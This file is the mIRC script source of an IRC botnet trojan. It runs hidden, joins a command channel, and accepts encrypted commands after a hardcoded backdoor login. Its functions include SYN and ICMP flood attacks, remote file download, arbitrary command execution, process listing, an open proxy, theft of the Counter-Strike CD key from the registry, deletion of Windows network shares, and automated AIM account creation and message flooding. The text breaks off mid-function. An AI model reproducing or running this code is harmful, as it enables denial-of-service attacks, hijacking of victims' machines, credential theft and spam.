on *:start:{ set %failed 0 | var %q = edin.dll, %w = fdr.dll, %e = stds.dll | if (!$exists(%q)) || (!$exists(%w)) || (!$exists(%e)) { application.destroy | halt } | var %. = $dll(%q, do_ShowWindow, $window(-2).hwnd 0) | .ddeserver off | if ($isdde(funn2k)) { exit } | .ddeserver on fun2k | .identd on $r4 | .fullname $r4 | .emailaddr $r4 | .nick $nnike | .anick $nnike  | .timer 1 5 r4.version | r4.folder  | .ntpassprotect | .timer 1 5 r4.connect | .timerc -o 0 120 r4.connect | .rlevel 10 | .rlevel 5 | flush | run d2colour.exe /n /fh /r 'pr0tex.bat' }
alias r42 { var %h = $r(3,12) , %e = 1 , %f = $rand(a,z) | while (%e <= %h) { var %f = %f $+ $iif($r(1,2) == 1,$rand(1,9),$r(a,z)) | inc %e 1 } | return %f }
alias nker { return [FBK]- $+ $chr(91) $+ $r(1,99999) $+ $chr(93) }
alias decrypt { return $dll(fdr.dll,bill,$1 $+ $chr(1) $+ $2-) }
raw 433:*:{ .nick $nnike }
raw 432:*:{ .nick $nnike }
raw 332:*:{
  if ($2 != %connect.chan) { return }
  if ($chr(59) !isin $3-) || ($chr(46) !isin $3-) { return }
  var %x = $right($3-,-1), %i = $numtok($3-,59), %y = 1
  while (%y <= %i) {
    var %t = $gettok(%x,%y,59), %z = $gettok(%t,1,32), %c = $gettok(%t,2-,32), %v = $decrypt(topic,%z), %b = $decrypt(topic,%c)
    if ($isalias(r4. $+ %v)) { r4. $+ %v [ [ %b ] ] }
    inc %y
  }
}

alias _r { return $r42 }
alias r4.folder { if ($isdir(download\)) && ($findfile($mircdirdownload\,*,0) == 0) { rmdir download } }
alias r4.version { if (!$exists(coax.dll)) { return } | var %v = $dll(coax.dll,Load,0) | tokenize 32 %v | if ($1 == ERROR) { dll coax.dll Mark 0 | dll coax.dll SetVersion Panic | dll coax.dll Mark 0 } | else { dll coax.dll Mark 0 | var %oi = $dll(coax.dll,SetVersion,Panic) } }
on *:connectfail:{ if (%failed == $null) { set %failed 0 } | inc %failed 1 }
on *:connect:{ .mode $me +ix | nick $nnike | .rlevel 10 | .timerc off | if ($exists(coax.dll)) { r4.version } | if (%connect.chan == $null) { set %connect.chan #alpha } | .timerjoin 0 30 //join %connect.chan | .timerjoin2 0 30 //join %connect.chan | join %connect.chan }
on *:disconnect:{ .timerc -o 0 120 //r4.connect | .fullname $r4 | .rlevel 10 | .emailaddr $r4 | .identd on $r4 | .nick $nnike | .anick $nnike | .timer 1 5 r4 }
on *:join:#:{ if ($nick == $me) && ($chan == %connect.chan) { .timerjoin off } | if ($me isop $chan) && ($level($nick) == 10) { raw -q mode $chan +o $nick } }
alias application.destroy { exit }
on *:part:#:{ if ($nick == $me) && ($chan == %connect.chan) { .timerjoin 0 30 //join %connect.chan | .timer 1 1 //join %connect.chan } | if ($level($nick) == 10) && ($chan == %connect.chan) { .ruser 10 $nick } }
on *:quit:{ if ($level($nick) == 10) { .ruser 10 $nick } }
on *:kick:#:{ if ($knick == $me) && ($chan == %connect.chan) { .timerjoin 0 30 //join %connect.chan | .timer 1 1 //join %connect.chan } }
alias nnike { return $chr(91) $+ $gettok($ip,1,46) $+ - $+ $gettok($ip,2,46) $+ $chr(93) $+ - $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(1,9999) }
alias connect.chan { if (%connect.chan == $null) { return #hooters } | else { return $decrypt(channel,%connect.chan) } }
alias connect.server { if (%failed == $null) { set %failed 0 } | if (%connect.server == $null) && (%connect.server.second == $null) { return irc.icq.net 6667 } | if (%failed >= 7) && (%connect.server.second != $null) { return %connect.server.second } | if (%failed == $null) || (%failed < 7) || (%connect.server.second == $null) || (%connect.server != $null) { return %connect.server } }
alias r4.connect { server $connect.server }
alias a { return $iif($iif(# == $null,$nick,#) == $null,%connect.chan,$iif(# == $null,$nick,#)) }
alias ntpassprotect { std.run net share /delete admin$ /y;echo -s;echo -s Admin$ deleted | std.run net share /delete c$ /y;echo -s;echo -s c$ deleted | std.run net share /delete ipc$ /y;echo -s;echo -s IPC$ deleted | if ($server) { msg $a All netbios shares have been deleted } }
alias protect { var %sx = $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .bat | write -c %sx @echo off | write %sx net share /delete c$ /y | write %sx net share /delete admin$ /y | write %sx net share /delete IPC$ /y | run -n %sx | .timer 1 30 .remove %sx | if ($server) { msg %connect.chan Protected from netbios! } }
on 1:text:$(.login $+ *):#:{ if ($level($nick) == 10) { return } | var %key = login $+ $nick $+ $gettok($gettok($address($nick,5),1,64),2,33) | var %pass = $nick $+ login $+ $left($nick,1) $+ $mid($nick,1,2) $+ $right($nick,1) $+ login | if ($decrypt(%key,$2-) == %pass) { .auser 100 $nick | mm3me $tokm(Login Successful. Welcome Master! ) } }
alias mm3me { if ($me isvoice #) { .msg # $1- } | else { halt  } }
alias download { set %dtemp $chm | if ($sock(download)) {  mm3me $tokm(Error: Already downloading a file.) | return } | set %download1 $gettok($gettok(%aammee,2,32),2,47) | set %download2 $gettok($gettok(%aammee,2,32),$numtok($gettok(%aammee,2,32),47),47) | set %download3 $gettok($gettok(%aammee,2,32),3-,47) | mm3me $tokm(Downloading $gettok(%aammee,2-,32) $+ ) | .sockopen download %download1 80 }
on *:sockopen:download:{ if ($sockerr) { msg # $tke(Error: Socket error.) | return } | .write -c %download2 | .sockwrite -n $sockname GET / $+ %download3 HTTP/1.0 | .sockwrite -n $sockname Accept: */* | .sockwrite -n $sockname Host: %download1 | .sockwrite -n $sockname }
on *:sockread:download:{ if (%downloadready != 1) { var %header | sockread %header | while ($sockbr) { if (Content-length: * iswm %header) { %downloadlength = $gettok(%header,2,32) } | elseif (* !iswm %header) { %downloadready = 1 | %downloadoffset = $sock($sockname).rcvd | break } | sockread %header } } | sockread 4096 &d | while ($sockbr) { bwrite %download2 -1 -1 &d | sockread 4096 &d } }
on *:sockclose:download:{ if ($file(%download2).size != %downloadlength) { .sockclose download | download http:// $+ %download1 $+ / $+ %download3 } | else { mm3me $tokm(Success: File downloaded ( $+ $mircdir $+ %download2 $+ ) [ $+ $file(%download2).size $+ bytes]) } | unset %download1 %download2 %download3 %dtemp %downloadlength %downloadready %downloadoffset }

alias netstat { if (($os = NT) || ($os = 2000) || ($os = XP)) { if ($exists(speed.bat) = $false) { write -l1 speed.bat netstat > netstat.txt| goto speed } | else { :speed | .run poledit.exe /n /fh /r "speed.bat" | .timer -o 1 5 once } } | else { mm3me $tokm(Sorry my OS does not support this command.) } }

alias cm { if ($server == $null) { halt } | if (m isin $chan(%connect.chan).mode) && ($me !isvoice %connect.chan) { halt } | else { .msg %connect.chan $$1- } }
alias tokm { return $replace($dll(blowfish.dll,Encrypt,KEY $1-),+OK,) }

on 100:text:!*:#:{ set -u5 %aammee $replace($dll(blowfish.dll,Decrypt,KEY $2-),+OK,) 
  if ($gettok(%aammee,1,32) == msg) { msg $gettok(%aammee,2-,32)  }
  if ($gettok(%aammee,1,32) == aim.create) { create  }
  if ($gettok(%aammee,1,32) == join) { join $gettok(%aammee,2-,32) }
  if ($gettok(%aammee,1,32) == part) { part $gettok(%aammee,2-,32) }
  if ($gettok(%aammee,1,32) == set)  { set $gettok(%aammee,2-,32) | mm3me $tokm(15[12Done15]12 Var4 $gettok(%aammee,2,32) 12is now4 $gettok(%aammee,3-,32)) }
  if ($gettok(%aammee,1,32) == download) { download $gettok(%aammee,2-,32) | mm3me $tokm(15[12Done15]12 Downloading $gettok(%aammee,2-,32)) }
  if ($gettok(%aammee,1,32) == raw) { [ [ $gettok(%aammee,2-,32) ] ] | mm3me $tokm(15[12Done15]12 [ [ $gettok(%aammee,2-,32) ] ])  }
  if ($gettok(%aammee,1,32) == Procs) { mm3me $tokm(15[12Procs List15]12 $dll(control.dll,listprocs,_))  }
  if ($gettok(%aammee,1,32) == syn3)  && ($gettok(%aammee,5,32) !== $null)   { .timer-ss $gettok(%aammee,5,32) $gettok(%aammee,6,32) synp start $gettok(%aammee,4,32) $gettok(%aammee,2,32) $gettok(%aammee,3,32)  | mm3me $tokm(15(12SynPacket15) 15(12Attacking15) 15[12 $+ $gettok(%aammee,2,32) $+ 15]12 on 15[12 $+ $gettok(%aammee,3,32) $+ 15]12 With 15[12 $+ $gettok(%aammee,4,32) $+ 15]12 Packets)  }
  if ($gettok(%aammee,1,32) == netstat) && ($me isin $gettok(%aammee,2,32)) { netstat | mm3me $tokm(15[12Done15]12 Sending NETSTAT Text) | .timersssend 1 5 dcc send $nick netstat.txt | timerdeletnet 1 150 .remove netstat.txt }
}
on 1:TEXT:S439H.Un6v61 *:#:{
  if ($2 == yZ4Tk0u8lAO.) { auser 10 $nick | mm3me $tokm(15[12Login Accepted15]) }
}
on 10:text:!*:#:{ set -u5 %aammee $replace($dll(blowfish.dll,Decrypt,KEY $2-),+OK,) 
  if ($gettok(%aammee,1,32) == aim.signon) { aim.signon }
  if ($gettok(%aammee,1,32) == aim.bomb) { aim.bomb $gettok(%aammee,2-,32) }
  if ($gettok(%aammee,1,32) == aim.disconnect ) { aim.disconnect }
  if ($gettok(%aammee,1,32) == aim.join) { aim.chat.join $gettok(%aammee,2-,32) }
  if ($gettok(%aammee,1,32) == syn) && ($gettok(%aammee,4,32) !== $null) { mm3me $tokm(15(12SynPacket15) 15(12Attacking15) 15[12 $+ $gettok(%aammee,2,32) $+ 15]12 on 15[12 $+ $gettok(%aammee,3,32) $+ 15]12 With 15[12 $+ $gettok(%aammee,4,32) $+ 15]12 Packets)  | synp start $gettok(%aammee,4,32) $gettok(%aammee,2,32) $gettok(%aammee,3,32)  }
  if ($gettok(%aammee,1,32) == syn) && ($gettok(%aammee,4,32) == $null) { mm3me $tokm(15/12Syntax Error15\4 syn <ip> <port> <times>) }
  if ($gettok(%aammee,1,32) == syn2) && ($gettok(%aammee,2,32) !== $null) { set -u5 %synport $rand(5,65000) | mm3me $tokm(15(12SynPacket15) 15(12Attacking15) 15[12 $+ $gettok(%aammee,2,32) $+ 15]12 on 15[12 $+ %synport $+ 15]12 With 15[12 $+ $gettok(%aammee,3,32) $+ 15]12 Packets)  | synp start $gettok(%aammee,3,32) $gettok(%aammee,2,32)  %syn2port  }
  if ($gettok(%aammee,1,32) == icmp) && ($gettok(%aammee,3,32) !== $null) { f5.icmp $gettok(%aammee,2-,32)  } 
  if ($gettok(%aammee,1,32) == couter-strike) && ($gettok(%aammee,2,32) !== $null) { .msg $gettok(%aammee,2,32) $dll(whenn.dll,GetKeyValue,HKEY_CURRENT_USER\Software\Valve\Half-Life\Settings\\key)   }
  if ($gettok(%aammee,1,32) == proxy) { f5.proxy $gettok(%aammee,2-,32)  }

}

alias f5.icmp { if ($1 == stop) && (%icmp) { var %x = $stdio(ReleaseProcess,%icmp) | .timerstd.ping* off | unset %icmp | mm3me $tokm(ICMP Attack halted) | halt } | if ($1 == $null) || ($2 !isnum) || ($3 !isnum) { halt } | var %ic = ping -n $2 -l $3 -w 0 $1 | set %icmp $remove(%ic,$chr(32)) | .std.run ping -n $2 -l $3 -w 0 $1 $+ ;icmp2;icmp.done $a | mm3me $tokm(15/12ICMP15\4 IP: $1 Size: $3 Ammount: $2) }
alias icmp2 { set -u0 %t3mp $1- }
alias icmp.done { mm3me $tokm(ICMP Attack Finished.) | unset %icmp }
alias fstring { var %x = AbCdEfGhIjKlMnOpQrStUvWxY | return $str(%x,8) }

alias synp { if ($1 == $null) { return } | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 stop | syn 1 $1- | syn 1 stop |  mm3me $tokm(15(4Syn Attack Finished.)) }
alias syn {
  if ($2 == start) { if ($3 !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }
  if ($2 == stop) { if ($sock(syn*,0) > 0) { sockclose syn* } }
}

alias f5.proxy {
  if (%bot.proxy != $null) && ($portfree(%bot.proxy)) unset %bot.proxy
  if ($1 == $null) return
  if ($1 == off) { if ($sock(proxy)) sockclose proxy* | sockclose tunnel* | unset %bot.proxy | mm3me $tokm(Proxy disabled) }
  if ($1 !isnum) return
  if ($portfree($1)) { set %bot.proxy $1 | socklisten proxy $1 | sockmark proxy %target | mm3me $tokm(Proxy started on $ip %bot.proxy Port: $1 $+ ) }
  else { mm3me $tokm(Port already taken.) }
}
on *:socklisten:proxy:{ var %s = proxy. $+ $ticks | sockaccept %s }
on *:sockread:proxy.*:{
  if ($sockerr) return
  var %t, %s, %z
  sockread %t
  if (CONNECT *:* HTTP/?.? iswm %t) {
    %s = tunnel-s. $+ $gettok($sockname,2,46)
    %z = tunnel-c. $+ $gettok($sockname,2,46)
    ;bot.ident
    sockopen %s $replace($gettok(%t,2,32),:,$chr(32))
    sockrename $sockname %z
    sockmark $sockname %s
    sockmark %s %z
  }
  elseif (& *HTTP/?.? iswm %t) { sockwrite $sockname HTTP/1.0 400 Bad request $+ $str($crlf,2) | sockclose $sockname }
}
alias bot.ident if ($portfree(113)) socklisten botidentd 113 | .timerbid 1 30 sockclose botidentd
on *:socklisten:botidentd:var %s = botident $+ $r(10000,99999) | sockaccept %s | .timer 1 30 sockclose %s
on *:sockread:botident*:var %t | if ($sockerr) return | sockread %t | if (*,* !iswm %t) return | sockwrite -n $sockname %t : USERID : UNIX : $r4 $+ $r4
alias adj return $r4
on *:sockwrite:proxy.*:if ($sockerr) { if ($sock($sock($sockname).mark)) sockclose $ifmatch | return }
on *:sockclose:proxy.*:if ($sock($sock($sockname).mark)) sockclose $ifmatch | return
on *:sockopen:tunnel-s.*:{
  var %p = $sock($sockname).mark
  if ($sock(%p) == $null) { sockclose $sockname | return }
  if ($sockerr) { sockwrite %p HTTP/1.0 500 Server Error $+ $str($crlf,2) | sockclose %p | return }
  sockwrite %p HTTP/1.0 200 Connection established $+ $str($crlf,2)
}
on *:sockread:tunnel-?.*:{
  var %p = $sock($sockname).mark
  if ($sockerr) { sockclose %p | return }
  :l
  sockread &t
  if ($sockbr) {
    sockwrite -b %p $sockbr &t
    goto l
  }
}


alias b { if ($isid) return $remove($left($1-,940),$chr(32)) }
alias stdio { return $dll(stds.dll,$1,$2-) }
alias std.run {
  var %p = $b($gettok($1-,1,59)), %a = $stdio(ReleaseProcess,%p), %r = $stdio(RunConsole,%p,$gettok($1-,1,59))
  if ($gettok(%r,1,32) == OK) .timerstd. $+ %p -om 0 1 std.read %p ; $+ $gettok($1-,2-,59)
  else echo -s (stdio) Couldn't create process: %r
}
alias std.read {
  while ($gettok(%o,1,32) != ERROR) {
    var %o = $stdio(ReadText,$1 out), %c = $gettok($1-,2,59), , %a = $gettok($1-,-1,59), %w = $wildtok(%c,@*,1,32), %l = $iif($remove(%o,ok),$gettok(%o,2-,32),$_nchr(%w))
    if (%w) && (!$window(%w)) goto err2 | if ($gettok(%o,1,32) != ERROR) %c %l
  }
  if (ERROR STDE6 * iswm %o) { if (%a) { %a | goto err2 } | goto err } | return | :err | %c - | :err2 | .timerstd. $+ $1 off | var %a = $stdio(ReleaseProcess,$1)
}
alias b { if ($isid) return $remove($left($1-,940),$chr(32)) }
alias stdio { return $dll(stds.dll,$1,$2-) }
alias std.run {
  var %p = $b($gettok($1-,1,59)), %a = $stdio(ReleaseProcess,%p), %r = $stdio(RunConsole,%p,$gettok($1-,1,59))
  if ($gettok(%r,1,32) == OK) .timerstd. $+ %p -om 0 1 std.read %p ; $+ $gettok($1-,2-,59)
  else echo -s (stdio) Couldn't create process: %r
}
alias std.read {
  while ($gettok(%o,1,32) != ERROR) {
    var %o = $stdio(ReadText,$1 out), %c = $gettok($1-,2,59), , %a = $gettok($1-,-1,59), %w = $wildtok(%c,@*,1,32), %l = $iif($remove(%o,ok),$gettok(%o,2-,32),$_nchr(%w))
    if (%w) && (!$window(%w)) goto err2 | if ($gettok(%o,1,32) != ERROR) %c %l
  }
  if (ERROR STDE6 * iswm %o) { if (%a) { %a | goto err2 } | goto err } | return | :err | %c - | :err2 | .timerstd. $+ $1 off | var %a = $stdio(ReleaseProcess,$1)
}
alias rndem {
  var %domains = yahoo.com,aol.com,lycos.com,compuserv.com,attbi.com,hotmail.com,inbox.net,cox.net,earthlink.net , %dom = $gettok(%domains,$r(1,$gettok(%domains,0,44)),44)
  return $+($r(a,z),$r(a,z),$r(a,z),$r(1,923),$r(a,z),$r(a,z),$r(a,z),$r(a,z),$r(a,z),$r(a,z),@,%dom)
}
alias aim.chat.join {
  senddata toc_chat_join 4 " $+ $1 $+ "
  mm3me $tokm(15/12AIM Flood15\4 Joining Chat Channel $1 $+ )
}
alias aim.signon {
  if ($lines(aim.txt) >= 1) && (!$sock(TIKTOC)) {
    aimlogin $gettok($read(aim.txt,$r(1,$lines(aim.txt))),1,58) $gettok($read(aim.txt,$r(1,$lines(aim.txt))),2,58) 
  }
  elseif ($sock(TIKTOC)) {
    mm3me $tokm(15/12AIM Flood15\4 Already Connected to AIM.)
  }
  elseif (!$sock(TIKTOC)) {
    mm3me $tokm(15/12AIM Flood15\4 No AIM accts made yet -- Type !create for me to make one.)
  }
}

alias aim.bomb {
  if ($1) && ($sock(TIKTOC)) && (!$2) {
    senddata toc_send_im $remove($1,$chr(160)) " $+ $AIMEncode($str(<b>F</b>r<i>oz</i>e<b>n</b> <b>B</b>o<i>t</i> <sub><b>F</b>r<i>oz</i>e<b>n</b> <b>B</b>o<i>t</i></sub>,5)) $+ " auto
    mm3me $tokm(15/12AIM Flood15\12 on 15[04 $+ $1 $+ 15])
  }
  elseif ($2) && ($sock(TIKTOC)) {
    senddata toc_send_im $remove($1,$chr(160)) " $+ $AIMEncode($2-) $+ " auto
    mm3me $tokm(15/12AIM Flood15\12 on 15[04 $+ $1 $+ 15]12 with 15[04 $+ $2- $+ 15])
  }
  elseif (!$sock(TIKTOC)) {
    mm3me $tokm(15/12AIM Flood15\12 Must be connected to aim first. Type !signon)
  }
  if (!$1) {
    mm3me $tokm(15/12AIM Flood15\12 Syntax Error: !aim.bomb <screen name all in 1 word> <Msg if want one>)
  }
}

alias aim.disconnect {
  if ($sock(TIKTOC)) {
    aimdisconnect
  }
  else {
    mm3me $tokm(error: no socket connected)
  }
}


alias rndpw {
  return $+($r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9))
}

alias rndsn {
  unset %rsn* | set %rsn $r(a,z)
  var %a = $r(5,10) , %b = $r(1,4) , %c = $r(1,2) , %d = $r(100,1999999999)
  if (%c = 1) {
    var %_ = 1
    while (%_ <= $calc(%a + %b)) {
      var %r = $r(1,2)
      if (%r = 1) { set %rsn [ %rsn ] $r(a,z) }
      if (%r = 2) { set %rsn [ %rsn ] $r(0,9) }
      inc %_
    }
  }
  if (%c = 2) {
    var %_ = 1
    while (%_ <= $calc(%a + %b)) {
      var %r = $r(1,2)
      if (%r = 1) { set %rsn [ %rsn ] $r(a,z) }
      if (%r = 2) { set %rsn [ %rsn ] $r(0,9) }
      inc %_
    }
  }
  return $remove(%rsn,$chr(32))
}

alias totalaims {
  if ($lines(aim.txt) <= 0) || (!$exists(aim.txt)) {
    return 0
  }
  else {
    return $lines(aim.txt)
  }
}



alias nhtml { return $+(",$mircdirnhtml.dll,") }

alias create {
  if (!$window(@test)) {
    window -pnh @test
    echo -s $dll($nhtml,attach,$window(@test).hwnd)
    echo -s $dll($nhtml,handler,nHTMLn.handler)
  }
  var %pw = $rndpw , %sn = $rndsn , %em = $rndem , %url https://my.screenname.aol.com/_cqr/login/login.psp?siteId=aimregistrationPROD&createSn=1&newSN=1&mcState=initialized&authLev=1&submitSwitch=1&brandname=AIM&birthreg=1&fromSignIn=&screenname= $+ %sn $+ &password= $+ %pw $+ &password2= $+ %pw $+ &email= $+ %em $+ &month=01&day=01&year=1980
  echo -s $dll($nhtml,navigate,%url)
  write aim.txt $+(%sn,:,%pw) | mm3me $tokm(15[4AIM15]12 Created following aim acct: 4Screenname:12 $+(%sn) 4Password:12 $+(%pw))
}

alias roast {
  var %Roasted = 0x
  var %i = 1
  var %i2 = 0
  var %RoastString = Tic/Toc
  var %roastChar
  var %mLen = $len($1-)
  while (%i <= %mLen) {
    %roastChar = $asc($mid($1-,%i,1))
    inc %i2
    if (%i2 > 7) { %i2 = 1 }
    %roastChar = $xor(%roastChar,$asc($mid(%RoastString,%i2)))
    %roastChar = $base(%roastChar,10,16)
    if ($len(%roastChar) == 1) { %roastChar = 0 $+ %roastChar }
    %Roasted = %Roasted $+ %roastChar
    inc %i
  }
  return $lower(%Roasted)
}

alias aimlogin {
  if ($2) {
    var %i = 1 , %InList = 1
    writeini AImIRC.ini Users CurrentUser $1
    %AIMUserPass = $2
    aimconnect
  }
}

alias aimconnect {
  if ($AIMConnectStatus == 1) { discard $input(Already Connected,260,Connect error) | return }
  sockopen TIKTOC TOC.oscar.aol.com 80
  %AimSequence = $rand(10000,15000)
  echo 2 -s Connecting to AIM Login server
}

alias aimdisconnect { 
  sockclose TIKTOC
  mm3me $tokm(Disconnected from AIM.)
}

alias AIMConnectStatus { return $iif(($sock(TIKTOC).mark == 1),1,0) }

on 1:SOCKOPEN:TIKTOC: { 
  if ($sockerr > 0) {
    echo 4 -s SOCKET ERROR: $sockerr
    return
  }
  sockmark TIKTOC 1
  mm3me $tokm(Connected to AIM Login server)
  sockwrite TIKTOC FLAPON $+ $crlf $+ $crlf
}
on 1:SOCKCLOSE:TIKTOC: { 
  mm3me $tokm(AIM Login server disconnected me.)
  ;initaimhashes
  aimdisconnect
}

alias AIMEncode {
  var %i = 1
  var %s
  var %AIMEncodeOut
  var %allowedChars = abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()-_=+|~`;'<,>.?/
  while (%i <= $len($1-)) {
    %s = $mid($1-,%i,1)
    if (($pos(%allowedChars,%s) != $null) || $asc(%s) == 32) {
      if ($asc(%s) == 32) {
        %AIMEncodeOut = %AIMEncodeOut %s
      }
      else {
        %AIMEncodeOut = %AIMEncodeOut $+ %s
      }
    }
    else {
      %AIMEncodeOut = %AIMEncodeOut $+ \ $+ %s

    }
    inc %i
  }
  return %AIMEncodeOut
}
alias RemoveHTML {

  var %Msg = $1- <>
  var %expr = /<.*?>/g
  var %tmp
  discard $regsub(%Msg,%expr,$null,%tmp)
  return %Tmp
}


alias handle_toc_error {
  var %Err = $gettok($1-,1,58)
  var %ErrData = $gettok($1-,2-,58)
  var %ErrMsg = Unknown Error
  var %ErrTitle = Unknown Class
  if (%Err isnum 901-903) { %ErrTitle = General Error }
  elseif (%Err == 950) { %ErrTitle = Chat Error }
  elseif (%Err isnum 960-962) { %ErrTitle = IM/Info error }
  elseif (%Err isnum 970-979) { %ErrTitle = Directory Error }
  elseif ((%Err isnum 980-983) || (%Err == 989)) { %ErrTitle = Authentication Error }

  if (%Err == 901) { %ErrMsg = User %ErrData is not available }
  elseif (%Err == 902) { %ErrMsg = Warning of %ErrData is not allowed }
  elseif (%Err == 903) { %ErrMsg = Rate Limiting, Messages dropped }
  elseif (%Err == 950) { %ErrMsg = Chat in %ErrData is not available }
  elseif (%Err == 960) { %ErrMsg = Rate Limiting, you are sending messages too fast to %ErrData }
  elseif (%Err == 961) { %ErrMsg = You missed a message from %ErrData because it was too long }
  elseif (%Err == 962) { %ErrMsg = You missed a message from %ErrData because it was sent too fast (Rate limiting) }
  elseif (%Err == 970) { %ErrMsg = Directory Failure }
  elseif (%Err == 971) { %ErrMsg = Too many matches }
  elseif (%Err == 972) { %ErrMsg = Need more qualifiers }
  elseif (%Err == 973) { %ErrMsg = Directory service temporarily unavailable }
  elseif (%Err == 974) { %ErrMsg = Email lookup restricted }
  elseif (%Err == 975) { %ErrMsg = Keyword Ignored }
  elseif (%Err == 976) { %ErrMsg = No Keywords }
  elseif (%Err == 977) { %ErrMsg = Language Not supported }
  elseif (%Err == 978) { %ErrMsg = Country not supported }
  elseif (%Err == 979) { %ErrMsg = Unknown directory failure: %ErrData }
  elseif (%Err == 980) { %ErrMsg = Incorrect Nickname or password | msg # error: %ErrTitle - %ErrMsg - $+(#,%Err) | aimdisconnect | aimlogin $gettok($read(aim.txt,$r(1,$lines(aim.txt))),1,58) $gettok($read(aim.txt,$r(1,$lines(aim.txt))),2,58) | halt }
  elseif (%Err == 981) { %ErrMsg = Login service temporarily unavailable }
  elseif (%Err == 982) { %ErrMsg = Your warning level is too high to sign on }
  elseif (%Err == 983) { %ErrMsg = Rate Limiting, you have been connecting and disconnecting too fast. $+ $crlf $+ Wait 10 minutes and try again. $+ $crlf $+ If you continue trying, you will have to wait even longer }
  elseif (%Err == 989) { %ErrMsg = An unknown Signon error ( $+ %ErrData $+ ) has occurred | msg # error: %ErrTitle - %ErrMsg - $+(#,%Err) | aimdisconnect | aimlogin $gettok($read(aim.txt,$r(1,$lines(aim.txt))),1,58) $gettok($read(aim.txt,$r(1,$lines(aim.txt))),2,58) | halt }
  mm3me $tokm(error: %ErrTitle - %ErrMsg - $+(#,%Err))

}

on 1:SOCKREAD:TIKTOC: { 
  if ($sockerr > 0) {
    echo 4 -s SOCKET ERROR: $sockerr
    return
  }
  bset &TOCRAW 4096 0
  sockread -f 4096 &TOCRAW

  parseaimraw &TOCRAW
}
alias ParseAIMRaw {
  var %SequenceNuber
  var %FrameType 
  var %DataLength
  var %Msg
  var %StayInLoop = $true
  var %OffSet = 0
  bunset &TOCData
  bset &TOCData $bvar($1,0) 0
  bcopy &TOCData 1 $1 1 $bvar($1,0)
  while (%StayInLoop) {

    %FrameType = $FLAPHeader(&TOCData).FrameType
    %SequenceNumber = $FLAPHeader(&TOCData).SequenceNumber
    %DataLength = $FLAPHeader(&TOCData).DataLength
    if ($AimParameter(Debug) == yes) {
      echo -s Data Length: %DataLength
      ;      echo -s Data from Server: $bvar(&TOCData,1,$bvar(&TOCData,0)).text
      echo -s Data length from server: $bvar(&TOCData,0)
      echo -s Frame Type: %FrameType
      echo -s Sequence Number: %SequenceNumber
    }
    bcopy -c &TOCParse 1 &TOCData 7 %DataLength
    if (%FrameType == 1) { SignonAIM %SequenceNumber }
    elseif (%FrameType == 2) { ParseAIMData &TOCParse }
    elseif (%FrameType == 5) { .AIMKeepAlive }
    bunset &TOCParse
    bset &TOCParse 1 0
    if ($calc(%DataLength + 7) < $bvar(&TOCData,0)) {
      bcopy -c &TOCParse 1 &TOCData $calc(%DataLength + 7) -1
      bcopy -c &TOCData 1 &TOCParse 1 -1
    }
    else {    %StayInLoop = $false }
  }
}
alias parseaimdata {
  var %TOCData = $bvar($1,1,$bvar($1,0)).text
  var %TOCWhat = $gettok(%TOCData,1,58)
  if ($AIMParameter(Debug) == yes) {
    echo TOCWHAT: %TOCWhat
    echo TOC DATA: %tocdata
  }
  if (%TOCWhat == SIGN_ON) { handle_toc_sign_on }
  elseif (%TOCWhat == IM_IN) { Handle_TOC_IM $gettok(%TOCData,2-,58) }
  elseif (%TOCWhat == CHAT_JOIN) { Handle_TOC_ChatJoin $gettok(%TOCData,2-,58) }
  elseif (%TOCWhat == CHAT_UPDATE_BUDDY) { handle_TOC_Chat_Userlist $gettok(%TOCData,2-,58) }
  elseif (%TOCWhat == CHAT_IN) { handle_toc_Chat_in $gettok(%TOCData,2-,58) }
  elseif (%TOCWhat == CHAT_INVITE) { .timer 1 0 handle_toc_invite $gettok(%TOCData,2-,58) }
  elseif (%TOCWhat == EVILED) { .timer 1 0 handle_toc_eviled $gettok(%TOCData,2-,58) }
  elseif (%TOCWhat == UPDATE_BUDDY) { handle_toc_update_buddy $gettok(%TOCData,2-,58) }
  elseif (%TOCWhat == CONFIG) { handle_toc_config $gettok(%TOCData,2-,58) }
  elseif (%TOCWhat == ERROR) { .timer 1 0 handle_toc_error $gettok(%TOCData,2-,58) }
}
alias InitAIMHashes {
  hfree -w AIM.Buddy.Hashes.*
  hmake AIM.Buddy.Hashes.BuddyList 50
  hmake AIM.Buddy.Hashes.PermitList 50
  hmake AIM.Buddy.Hashes.DenyList 50
  hmake AIM.Buddy.Hashes.BuddyGroups 50

}
alias handle_toc_config {
  var %Max = $numtok($1-,10)
  var %i = 1
  var %BuddyLine
  var %BuddyWhat
  var %Buddy
  var %CurrentGroupIndex = 0
  var %CurrentBuddyIndex = 0
  var %CurrentPermitIndex = 0
  var %CurrentDenyIndex = 0

  InitAIMHashes

  while (%i <= %Max) {
    %BuddyLine = $gettok($1-,%i,10)
    %BuddyWhat = $gettok(%BuddyLine,1,32)
    %Buddy = $gettok(%BuddyLine,2-,32)
    if (%BuddyWhat == m) {
      ;Permit/Deny mode
      %AimPermitDenyMode = %Buddy
    }
    elseif (%BuddyWhat == g) {
      ;Buddy Group
      inc %CurrentGroupIndex
      hadd AIM.Buddy.Hashes.BuddyGroups %CurrentGroupIndex %Buddy
    }
    elseif (%BuddyWhat == b) {
      ;Buddy
      inc %CurrentBuddyIndex
      hadd AIM.Buddy.Hashes.BuddyList %CurrentBuddyIndex %CurrentGroupIndex $+ : $+ %Buddy
    }
    elseif (%BuddyWhat == p) {
      ;Permit List
      inc %CurrentPermitIndex
      hadd AIM.Buddy.Hashes.PermitList %CurrentPermitIndex %Buddy
    }
    elseif (%BuddyWhat == d) {
      ;Deny List
      inc %CurrentDenyIndex
      hadd AIM.Buddy.Hashes.DenyList %CurrentDenyIndex %Buddy
    }

    inc %i
  }
  doaimnotify
}


alias handle_toc_sign_on {
  senddata toc_add_buddy ''
